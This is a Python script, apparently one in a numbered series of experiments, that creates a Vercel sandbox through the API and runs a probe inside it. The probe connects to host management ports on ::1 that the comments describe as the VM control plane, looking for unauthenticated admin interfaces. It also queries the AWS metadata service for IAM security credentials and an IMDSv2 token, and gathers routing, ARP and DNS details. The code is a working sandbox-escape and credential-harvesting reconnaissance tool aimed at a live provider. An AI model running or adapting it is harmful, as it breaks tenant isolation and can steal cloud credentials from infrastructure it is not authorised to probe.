# 实验J24: 连接 ::1 三个管理端口(23456/30001/30002) + AWS 元数据探测
# J23: ::1 监听 23456/30001/30002 = VM(celld) 管理面, netns 共享可连!
# 目标: banner/HTTP 探测 -> 识别服务 -> 找未认证管理接口
import json, base64, pathlib, time, urllib.request, urllib.error

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=180):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj24"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r'''
import socket, time

def tcp_probe(host, port, payload=None, timeout=3):
    try:
        s = socket.socket(socket.AF_INET6 if ":" in host else socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if payload:
            s.sendall(payload)
        data = b""
        try:
            while True:
                c = s.recv(4096)
                if not c:
                    break
                data += c
                if len(data) > 8000:
                    break
        except socket.timeout:
            pass
        s.close()
        return data
    except Exception as e:
        return b"ERR: " + str(e).encode()

for port in (23456, 30001, 30002):
    print(f"\n=== ::1:{port} banner ===", flush=True)
    d = tcp_probe("::1", port, timeout=3)
    print(repr(d[:2000]), flush=True)
    if not d.startswith(b"ERR") and b"HTTP" not in d:
        print(f"--- ::1:{port} HTTP GET / ---", flush=True)
        d2 = tcp_probe("::1", port, b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n", timeout=4)
        print(repr(d2[:2000]), flush=True)
        print(f"--- ::1:{port} HTTP GET /healthz ---", flush=True)
        d3 = tcp_probe("::1", port, b"GET /healthz HTTP/1.1\r\nHost: localhost\r\n\r\n", timeout=4)
        print(repr(d3[:1500]), flush=True)

print("\n=== AWS metadata 169.254.169.254 ===", flush=True)
for path in ["/latest/meta-data/", "/latest/meta-data/iam/security-credentials/", "/"]:
    d = tcp_probe("169.254.169.254", 80, f"GET {path} HTTP/1.1\r\nHost: 169.254.169.254\r\n\r\n".encode(), timeout=2)
    print(path, "->", repr(d[:500]), flush=True)

print("\n=== AWS IMDSv2 token ===", flush=True)
d = tcp_probe("169.254.169.254", 80, b"PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n", timeout=2)
print(repr(d[:800]), flush=True)

print("\n=== 172.31.0.2:53 TCP ===", flush=True)
d = tcp_probe("172.31.0.2", 53, timeout=2)
print(repr(d[:300]), flush=True)

print("\n=== gateway 探测 ===", flush=True)
import subprocess
print(subprocess.run(["bash","-c","ip route 2>/dev/null; cat /proc/net/route"],capture_output=True,text=True).stdout, flush=True)
print(subprocess.run(["bash","-c","cat /etc/resolv.conf; cat /proc/net/arp 2>/dev/null"],capture_output=True,text=True).stdout, flush=True)
'''
run_cmd(sid, PROBE, "probe", wait=True, timeout=120000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
